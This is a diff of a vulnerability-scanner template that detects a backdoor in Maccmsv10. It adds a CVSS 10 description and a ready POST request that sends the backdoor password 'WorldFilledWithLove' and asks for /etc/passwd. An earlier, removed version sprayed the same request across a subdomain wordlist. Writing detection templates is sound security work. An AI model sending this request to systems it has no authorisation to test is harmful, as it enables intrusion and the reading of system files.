@@ -1,34 +1,42 @@
 id: maccmsv10-backdoor
+
 info:
-  name: Maccmsv10 Backdoor
+  name: Maccmsv10 - Backdoor Remote Code Execution
   author: princechaddha
   severity: critical
-  tags: maccmsv10,rce
+  description: Maccmsv10 contains a backdoor which can be exploited by remote attackers. The backdoor is accessible via the '/index.php/bbs/index/download' endpoint and the special 'getpwd' parameter value of 'WorldFilledWithLove'. Exploitation of this vulnerability will allow remote attackers to execute code.
+  reference:
+    - https://github.com/chaitin/xray/blob/master/pocs/maccmsv10-backdoor.yml
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+  tags: maccmsv10,rce,backdoor
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
 
-    raw:
-      - |
-        POST /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1 HTTP/1.1
-        Host: {{Subdomains}}
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Content-Type: application/x-www-form-urlencoded
+    body: "getpwd=WorldFilledWithLove"
 
-        getpwd=WorldFilledWithLove
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
     matchers-condition: and
     matchers:
       - type: word
+        part: body
         words:
           - "扫描后门"
           - "反弹端口"
           - "文件管理"
         condition: and
-        part: body
+
       - type: status
         status:
           - 200
+
+# digest: 4a0a00473045022100dd2bcec6cb513d21aef0e621346a44dec5447fd6ba0e17262b16b9d64d3a521002200bfdd41f743932e8b7de0a3373f0b4e37aa2c130a66f2d64cba62878097ce61f:922c64590222798bb761d5b6d8e72950
